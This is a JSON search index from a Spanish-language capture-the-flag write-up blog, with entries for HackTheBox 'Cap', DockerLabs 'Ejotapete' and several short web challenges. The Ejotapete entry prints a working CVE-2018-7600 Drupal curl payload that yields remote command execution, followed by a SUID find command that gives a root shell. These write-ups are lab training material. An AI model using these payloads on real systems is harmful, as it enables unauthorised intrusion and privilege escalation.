SF:ions,B3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Sat, SF:\\x2017\\x20Aug\\x202024\\x2022:55:22\\x20GMT\\r\\nConnection:\\x20close\\r\\nCon SF:tent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20HEAD,\\x20GET,\\x2 SF:0OPTIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,121,\u0026#34;HTTP/1\\.1 SF:\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20t SF:ext/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n\u0026lt;html\u0026gt;\\n\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\ SF:x20\\x20\\x20\u0026lt;title\u0026gt;Bad\\x20Request\u0026lt;/title\u0026gt;\\n\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\u0026lt;bod SF:y\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad\\x20Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20\\x20Inv SF:alid\\x20HTTP\\x20Version\\x20\u0026amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20\u0026amp;#x27;R SF:TSP/1\\.0\u0026amp;#x27;\u0026amp;#x27;\\n\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(FourOhFourRequest, SF:189,\u0026#34;HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x SF:20Sat,\\x2017\\x20Aug\\x202024\\x2022:55:27\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x202 SF:32\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTML\\x203\\.2\\ SF:x20Final//EN\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;404\\x20Not\\x20Found\u0026lt;/title\u0026gt;\\n\u0026lt;h1\u0026gt;Not\\x20Found\u0026lt;/ SF:h1\u0026gt;\\n\u0026lt;p\u0026gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x20 SF:server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\x2 SF:0check\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.\u0026lt;/p\u0026gt;\\n\u0026#34;); Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Aug 18 00:57:20 2024 -- 1 IP address (1 host up) scanned in 175.28 seconds\rVamos a ver el puerto 80:\nShell as nathan Podremos ver que estamos como el usuario Nathan, si investigamos un poco por la web podremos encontrarnos lo siguiente:\nPodremos ver que es como una captura de la red, si vemos en la izquierda en el panel podremos ver Security Snapshot (5 Second PCAP + Analysis) si entramos podremos ver lo siguiente:\nPodremos ver que nos a llevado a /data/6 y podemos descargarnos un archivo .pcap pero si nos lo descargamos y lo abrimos no habra nada, intentaremos ver mas data de la siguiente manera:\nPodremos ver que ahora si habra data, asi que nos bajaremos el .pcap:\nAhora lo abriremos con WireShark:\nSi bajamos un poco podremos ver data por el puerto 21 que es el FTP, y si vemos bien se efectua un login donde podemos encontrar la contraseña:\nProbaremos a iniciar por FTP a ver si son validas:\nBien son validas, ahora probaremos por SSH a ver si tambien nos funciona:\nShell as root Usaremos Linpeas y podremos ver lo siguiente:\nPodremos ir a GTFOBins y buscaremos python capabilities:\nroot! ;)\n","date":"2023-09-07","id":14,"permalink":"/writeups/hackthebox/cap/","summary":"Enumeration Comenzaremos con un escaneo nmap:\n# Nmap 7.94SVN scan initiated Sun Aug 18 00:54:24 2024 as: nmap -p- --open -sCVS -vvv -n -Pn -oN target 10.","tags":[],"title":"Cap"},{"content":" ","date":"2023-09-07","id":15,"permalink":"/writeups/dockerlabs/eclipse/","summary":" ","tags":[],"title":"Eclipse"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 172.17.0.2 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 11:09 CEST Initiating ARP Ping Scan at 11:09 Scanning 172.17.0.2 [1 port] Completed ARP Ping Scan at 11:09, 0.04s elapsed (1 total hosts) Initiating SYN Stealth Scan at 11:09 Scanning 172.17.0.2 [65535 ports] Discovered open port 80/tcp on 172.17.0.2 Completed SYN Stealth Scan at 11:09, 0.67s elapsed (65535 total ports) Nmap scan report for 172.17.0.2 Host is up, received arp-response (0.0000060s latency). Scanned at 2025-07-17 11:09:56 CEST for 1s Not shown: 65534 closed tcp ports (reset) PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 64 MAC Address: 02:42:AC:11:00:02 (Unknown) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVemos el puerto 80 abierto, vamos a lanzar un segundo escaneo para ver que servicio y versión corren en el:\n┌──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] └─$ nmap -p80 -sCV 172.17.0.2 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 11:10 CEST Nmap scan report for 172.17.0.2 Host is up (0.000031s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 |_http-title: 403 Forbidden |_http-server-header: Apache/2.4.25 (Debian) MAC Address: 02:42:AC:11:00:02 (Unknown) Service Info: Host: 172.17.0.2 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.47 seconds\rBien vemos devuelve un 403 Forbidden, así que estará haciendo mal el redirect o habrá algo oculto. Vamos a verlo en firefox:\nHmm\u0026hellip; Vamos a hacer fuzzing a ver si encontramos algo más interesante:\n┌──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://172.17.0.2/FUZZ\u0026#34; -e .php,.html,.js,.txt,.css /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://172.17.0.2/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt .css :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ drupal [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]\rVemos una carpeta llamada drupal, esto ya es más interesante. Vamos a acceder a ella:\nInteresante vamos a realizar fuzzing a la carpeta drupal a ver si encontramos algún archivo predeterminado que nos pueda chivar la versión:\n┌──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] 11:15:26 [9/9] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://172.17.0.2/drupal/FUZZ\u0026#34; -e .php,.html,.js,.txt,.css /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://172.17.0.2/drupal/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt .css :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ index.php [Status: 200, Size: 8902, Words: 1473, Lines: 233, Duration: 201ms] contact [Status: 200, Size: 12198, Words: 1639, Lines: 252, Duration: 81ms] search [Status: 302, Size: 388, Words: 60, Lines: 12, Duration: 10ms] user [Status: 302, Size: 384, Words: 60, Lines: 12, Duration: 6ms] themes [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms] modules [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 0ms] admin [Status: 403, Size: 8087, Words: 1367, Lines: 214, Duration: 18ms] node [Status: 200, Size: 8892, Words: 1473, Lines: 233, Duration: 11ms] sites [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 0ms] Search [Status: 302, Size: 388, Words: 60, Lines: 12, Duration: 1009ms] Contact [Status: 200, Size: 12180, Words: 1638, Lines: 252, Duration: 11ms] core [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms] install.php [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 0ms] profiles [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 0ms] update.php [Status: 403, Size: 133, Words: 21, Lines: 1, Duration: 98ms] README.txt [Status: 200, Size: 5889, Words: 748, Lines: 140, Duration: 0ms] vendor [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 0ms]\rVemos el archivo install.php, vamos a acceder a el:\nBien tenemos la versión de Drupal que es la 8.5.0, si hacemos una búsqueda de ella podremos darnos cuenta de que hay publicado un CVE:\nhttps://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2018-7600 Shell as www-data Vamos a explotarlo!!\nInvestigando me encontré con el siguiente payload:\ncurl -s \u0026#39;http://DRUPAL-TARGET/user/register?element_parents=account/mail/%23value\u0026amp;ajax_form=1\u0026amp;_wrapper_format=drupal_ajax\u0026#39; \\ --data \u0026#39;form_id=user_register_form\u0026amp;_drupal_ajax=1\u0026amp;mail[a][#post_render][]=exec\u0026amp;mail[a][#type]=markup\u0026amp;mail[a][#markup]=id\u0026#39;\rVamos a probarlo contra nuestro objetivo:\n┌──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] └─$ curl -s \u0026#39;http://172.17.0.2/drupal/user/register?element_parents=account/mail/%23value\u0026amp;ajax_form=1\u0026amp;_wrapper_format=drupal_ajax\u0026#39; \\ --data \u0026#39;form_id=user_register_form\u0026amp;_drupal_ajax=1\u0026amp;mail[a][#post_render][]=exec\u0026amp;mail[a][#type]=markup\u0026amp;mail[a][#markup]=id\u0026#39; {\u0026#34;command\u0026#34;:\u0026#34;insert\u0026#34;,\u0026#34;method\u0026#34;:\u0026#34;replaceWith\u0026#34;,\u0026#34;selector\u0026#34;:null,\u0026#34;data\u0026#34;:\u0026#34;uid=33(www-data) gid=33(www-data) groups=33(www-data)\\u003Cspan class=\\u0022ajax-new-content\\u0022\\u003E\\u003C\\/span\\u003E\u0026#34;,\u0026#34;settings\u0026#34;:null}]\rBien!! Logramos una ejecución remota de comandos. Ahora nos enviaremos una reverse shell:\nShell as root Vamos a enumerar binarios con el permiso SUID:\nwww-data@42beeea01109:/var/www/html/drupal$ find / -perm -4000 -ls 2\u0026gt;/dev/null find / -perm -4000 -ls 2\u0026gt;/dev/null 4850458 40 -rwsr-xr-x 1 root root 40504 May 17 2017 /usr/bin/chsh 4850546 40 -rwsr-xr-x 1 root root 40312 May 17 2017 /usr/bin/newgrp 4850503 76 -rwsr-xr-x 1 root root 75792 May 17 2017 /usr/bin/gpasswd 4850556 60 -rwsr-xr-x 1 root root 59680 May 17 2017 /usr/bin/passwd 4882251 220 -rwsr-xr-x 1 root root 221768 Feb 18 2017 /usr/bin/find 4850456 52 -rwsr-xr-x 1 root root 50040 May 17 2017 /usr/bin/chfn 4882165 140 -rwsr-xr-x 1 root root 140944 Jan 23 2021 /usr/bin/sudo 4849935 44 -rwsr-xr-x 1 root root 44304 Mar 7 2018 /bin/mount 4849958 32 -rwsr-xr-x 1 root root 31720 Mar 7 2018 /bin/umount 4849951 40 -rwsr-xr-x 1 root root 40536 May 17 2017 /bin/su\rVemos el binario find que si lo buscamos en GTFObins nos comentan lo siguiente:\nBien vamos a explotarlo:\nwww-data@42beeea01109:/var/www/html/drupal$ /usr/bin/find . -exec /bin/bash -p \\; -quit ; -quitn/find . -exec /bin/bash -p \\; bash-4.4# whoami whoami root\r","date":"2023-09-07","id":16,"permalink":"/writeups/dockerlabs/ejotapete/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 172.17.0.2 Starting Nmap 7.","tags":[],"title":"Ejotapete"},{"content":" ","date":"2023-09-07","id":17,"permalink":"/writeups/hackmyvm/method/","summary":" ","tags":[],"title":"Method (Video)"},{"content":" ","date":"2023-09-07","id":18,"permalink":"/writeups/dockerlabs/upload/","summary":" ","tags":[],"title":"Upload"},{"content":"Vamos a ver la web:\nVemos un simple login, no disponemos ningún tipos de credenciales. Vamos a leer el código fuente:\nEncontramos una contraseña!! Vamos a probarla:\n","date":"2025-07-16","id":19,"permalink":"/challenges/hackmyvm/002/","summary":"Vamos a ver la web:\nVemos un simple login, no disponemos ningún tipos de credenciales. Vamos a leer el código fuente:","tags":[],"title":"002 (Web)"},{"content":"\r","date":"2025-07-16","id":20,"permalink":"/challenges/hackmyvm/009/","summary":"\r","tags":[],"title":"009 (Web)"},{"content":"Vamos a ver la web:\nVemos que solo hay una imagen, vamos a ver el código fuente:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;style\u0026gt; img { display: block; margin-left: auto; margin-right: auto; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img src=\u0026#34;logo.png\u0026#34; alt=\u0026#34;HMV\u0026#34; style=\u0026#34;width:50%;\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\rNo vemos nada interesante. Vamos a hacer fuzzing con gobuster por archivos y directorios:\n❯ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#39;http://momo.hackmyvm.eu/\u0026#39; -x php,html,js,txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://momo.hackmyvm.eu/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,html,js,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 268] /robots.txt (Status: 200) [Size: 15]\rVemos un robots.txt , vamos a ver su contenido:\n","date":"2025-07-16","id":21,"permalink":"/challenges/hackmyvm/014/","summary":"Vamos a ver la web:\nVemos que solo hay una imagen, vamos a ver el código fuente:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;style\u0026gt; img { display: block; margin-left: auto; margin-right: auto; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img src=\u0026#34;logo.","tags":[],"title":"014 (Web)"},{"content":"Link to valuable, relevant resources.\n","date":"2024-02-27","id":22,"permalink":"/challenges/resources/","summary":"Link to valuable, relevant resources.","tags":[],"title":"Resources"},{"content":"Link to valuable, relevant resources.\n","date":"2024-02-27","id":23,"permalink":"/writeups/resources/","summary":"Link to valuable, relevant resources.","tags":[],"title":"Resources"},{"content":"","date":"2023-09-07","id":24,"permalink":"/challenges/","summary":"","tags":[],"title":"Bienvenido"},{"content":"","date":"2023-09-07","id":25,"permalink":"/writeups/","summary":"","tags":[],"title":"Bienvenido"},{"content":"","date":"2023-09-07","id":26,"permalink":"/challenges/intro/","summary":"","tags":[],"title":"INTRO"},{"content":"","date":"2023-09-07","id":27,"permalink":"/writeups/intro/","summary":"","tags":[],"title":"INTRO"},{"content":"","date":"2025-06-15","id":28,"permalink":"/tags/arch-linux/","summary":"","tags":[],"title":"Arch Linux"},{"content":"","date":"2025-06-15","id":29,"permalink":"/categories/","summary":"","tags":[],"title":"Categories"},{"content":"","date":"2025-06-15","id":30,"permalink":"/tags/cve-2023-3452/","summary":"","tags":[],"title":"CVE-2023-3452"},{"content":"","date":"2025-06-15","id":31,"permalink":"/tags/nvidia/","summary":"","tags":[],"title":"Nvidia"},{"content":"","date":"2025-06-15","id":32,"permalink":"/categories/poc/","summary":"","tags":[],"title":"PoC"},{"content":"","date":"2025-06-15","id":33,"permalink":"/tags/rce/","summary":"","tags":[],"title":"RCE"},{"content":"","date":"2025-06-15","id":34,"permalink":"/tags/rfi/","summary":"","tags":[],"title":"RFI"},{"content":"","date":"2025-06-15","id":35,"permalink":"/tags/","summary":"","tags":[],"title":"Tags"},{"content":"","date":"2025-06-15","id":36,"permalink":"/tags/unauthenticated/","summary":"","tags":[],"title":"Unauthenticated"},{"content":"","date":"2023-09-07","id":37,"permalink":"/privacy/","summary":"","tags":[],"title":"Privacy Policy"},{"content":"","date":"2023-09-07","id":38,"permalink":"/","summary":"","tags":[],"title":"pylon"},{"content":"","date":"0001-01-01","id":39,"permalink":"/contributors/","summary":"","tags":[],"title":"Contributors"}]